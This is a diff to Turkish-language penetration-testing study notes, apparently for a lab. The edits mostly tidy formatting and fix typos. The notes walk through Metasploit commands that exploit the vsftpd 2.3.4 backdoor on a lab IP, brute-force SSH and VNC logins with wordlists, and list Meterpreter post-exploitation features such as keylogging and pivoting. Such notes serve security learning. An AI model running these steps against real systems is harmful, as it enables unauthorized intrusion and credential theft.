@@ -87,17 +87,17 @@ nmap → temel
 
 ## 1. FTP ile Hacklemek (port21)
 
-- 21/tcp open ftp vsftpd 2.3.4
+- 21/tcp open ftp vsftpd 2.3.4 // nmap sorgusu sonucu
 - "vsftpd 2.3.4 exploit" şeklinde arama yapılır
 
 - > msfconsole //Metasploit Console giriş yapılır
-- > msf6> ~use exploit/unix/ftp/vsftpd_234_backdoor
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show options
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~set rhosts 10.0.2.5
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~show targets //hedefleri gösterir
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~exploit -j -z //exploit çalıştırılır (başarı zafiyete bağlıdır)
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions -l //açık olan bağlantıların listesi çıkar
-- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions 1
+- > msf6> use exploit/unix/ftp/vsftpd_234_backdoor
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show options
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> set rhosts 10.0.2.5
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> show targets //hedefleri gösterir
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> exploit -j -z //exploit çalıştırılır (başarı zafiyete bağlıdır)
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> sessions -l //açık olan bağlantıların listesi çıkar
+- > msf6 exploit(unix/ftp/vsftpd_234_backdoor)> sessions 1
 - > ls // hacklenen bilgisayarın terminalinde ls çıkarır
 - > uname -a //içersinde olduğunuz linux hakkında bilgi verir. Hangi makinede olduğunu kurban/kendi gösterir
 
@@ -128,7 +128,7 @@ nmap → temel
 
 ## 4. Meterpreter--SQL Port (1433 / 3306 / 5432)
 
-- Bir sisteme erişim sağlandıktan sonra: Komut çalıştırma, Dosya işlemleri, Ekran görüntüsü, Keylogging (yetkili testte) ,Ağ pivoting, Yetki yükseltme (uygun senaryoda)
+- Meterpreter: Bir sisteme erişim sağlandıktan sonra: Komut çalıştırma, Dosya işlemleri, Ekran görüntüsü, Keylogging (yetkili testte) ,Ağ pivoting, Yetki yükseltme (uygun senaryoda)
 - Meterpreter’in SQL servisi üzerinden tetiklenmiş olması muhtemel.Hep sql portuyla tetiklenmeyebilir
 
 - nmap sonuçlarında "PostgreSQL DB 8.3.0 - 8.3.7 cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak
@@ -208,7 +208,7 @@ meterpreter > help // Meterpreter içerisinde kullanabileceğin tüm modülleri 
 > msf6> ~search ssh
 > msf6> ~use auxiliary/sc..../ssh_login // Login olan kullanılır
 > msf6 auxiliary (sc..../ssh_login)> ~show options // required/yes olanlar zorunlu girilmeli
-> msf6 auxiliary (sc..../ssh_login)> ~ set RHOSTS 10.0.2.17
+> msf6 auxiliary (sc..../ssh_login)> ~set RHOSTS 10.0.2.17
 > msf6 auxiliary (sc..../ssh_login)> ~set VERBOSE yes //çıktı yapar
 > msf6 auxiliary (sc..../ssh_login)> ~set USERNAME msfadmin // Username veya password biliniyorsa diğerini bulmak için girilir
 > msf6 auxiliary (sc..../ssh_login)> ~set PASS_FILE /home/kali/sshpassword.txt // pass_file veya userpass_file wordlistleri girilebilir veya kendin oluşuturup gir
@@ -225,7 +225,7 @@ meterpreter > help // Meterpreter içerisinde kullanabileceğin tüm modülleri 
 > msfconsole
 > msf6> ~search ssh
 > msf6> ~use auxiliary/sc..../vnc_login //login olanı cp
-> msf6 auxiliary (sc..../vnc_login)> ~show options //required yes olanlar zorunlu girlir. Password kısmına wordlist eklenir
+> msf6 auxiliary (sc..../vnc_login)> ~show options //required yes olanlar zorunlu girilir. Password kısmına wordlist eklenir
 > msf6 auxiliary (sc..../vnc_login)> ~exploit //hacklemeye başlar. bulduğunda password görünür
 
 - yeni terminal
